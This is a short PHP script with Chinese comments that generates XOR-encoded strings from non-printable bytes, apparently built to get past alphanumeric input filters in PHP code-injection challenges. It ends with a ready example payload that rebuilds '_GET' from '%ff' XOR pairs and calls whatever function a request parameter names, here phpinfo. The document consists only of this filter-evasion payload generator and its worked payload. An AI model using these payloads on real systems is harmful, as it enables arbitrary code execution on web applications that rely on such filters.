<?php

#用不可见字符异或
$l = "";
$r = "";
$argv = str_split(".");
// $argv = str_split("scandir");
for($i=0;$i<count($argv);$i++)
{
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);
        if($k == $argv[$i]){
            if($j<16){
                $l .= "%ff";
                $r .= "%0" . dechex($j);
                continue;
            }
            $l .= "%ff";
            $r .= "%" . dechex($j);
            continue;
        }
    }
}
echo "(".$l."^".$r.")";
#{%ff%ff%ff%ff^%a0%b8%ba%ab}       =_GET
#?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
?>
